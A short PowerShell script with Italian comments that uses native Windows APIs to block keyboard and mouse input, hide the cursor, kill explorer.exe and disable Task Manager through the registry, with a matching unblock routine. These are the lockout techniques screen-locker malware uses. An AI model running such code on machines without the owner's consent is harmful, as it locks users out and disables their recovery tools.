# Script PowerShell per bloccare input usando API Windows native
# Non richiede compilazione - chiamate dirette alle API

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class InputBlocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);

    [DllImport("user32.dll")]
    public static extern int ShowCursor(bool bShow);

    public static bool Block() {
        // Blocca tutto l'input
        bool result = BlockInput(true);

        // Nascondi cursore
        ShowCursor(false);

        // Killa explorer.exe
        try {
            foreach (Process proc in Process.GetProcessesByName("explorer")) {
                proc.Kill();
            }
        } catch { }

        // Disabilita Task Manager
        try {
            Microsoft.Win32.Registry.SetValue(
                "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                "DisableTaskMgr",
                1,
                Microsoft.Win32.RegistryValueKind.DWord
            );
        } catch { }

        return result;
    }

    public static void Unblock() {
        // Sblocca input
        BlockInput(false);

        // Mostra cursore
        ShowCursor(true);

        // Riavvia explorer
        try {
            Process.Start("C:\\Windows\\explorer.exe");
        } catch { }

        // Riabilita Task Manager
        try {
            Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                true
            )?.DeleteValue("DisableTaskMgr", false);
        } catch { }
    }
}
"@

# Ricevi comando da stdin
$command = $args[0]

if ($command -eq "block") {
    $result = [InputBlocker]::Block()
    if ($result) {
        Write-Output "BLOCKED"
    } else {
        Write-Output "FAILED"
    }
} elseif ($command -eq "unblock") {
    [InputBlocker]::Unblock()
    Write-Output "UNBLOCKED"
}
